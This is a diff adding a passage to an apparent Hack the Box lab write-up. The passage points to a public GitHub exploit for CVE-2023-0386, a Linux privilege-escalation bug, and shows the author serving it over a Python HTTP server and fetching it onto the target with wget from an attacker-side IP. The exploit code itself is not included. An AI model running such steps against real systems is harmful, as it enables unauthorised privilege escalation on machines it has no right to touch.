@@ -555,3 +555,18 @@ DISTRIB_DESCRIPTION="Ubuntu 22.04.2 LTS"
 ```
 ![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/53694f5d-c5f0-4d21-8f5b-a8cf0d2da9c0)
 
+Search Exploit
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/b1e5eefd-437c-4598-98ce-beda77ad174c)
+
+Github exploit
+https://github.com/sxlmnwb/CVE-2023-0386
+
+Get Exploit
+```shell
+python m http.server
+```
+
+```shell
+wget http://10.10.14.23:8000/CVE-2023-0386
+```
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/782e49f8-b3a1-4852-8933-4dd5ed585848)
